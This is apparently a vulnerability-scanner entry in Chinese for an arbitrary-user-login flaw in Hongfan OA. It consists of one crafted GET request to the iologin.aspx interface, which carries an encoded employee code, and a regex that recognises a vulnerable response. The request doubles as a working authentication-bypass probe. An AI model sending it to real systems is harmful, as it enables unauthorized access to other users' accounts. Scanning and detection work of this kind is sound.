# 红帆OA任意用户登录漏洞

红帆OA任意用户登录 ｜ 其他 ｜ —
- **请求**：`GET /iOffice/prg/interface/iologin.aspx?iempcode=SENHRkU=&reurl=1 HTTP/1.1`
- **响应特征**：200 ^(?=.*?HCGFE)(?=.*?找不到对应的人员).*?$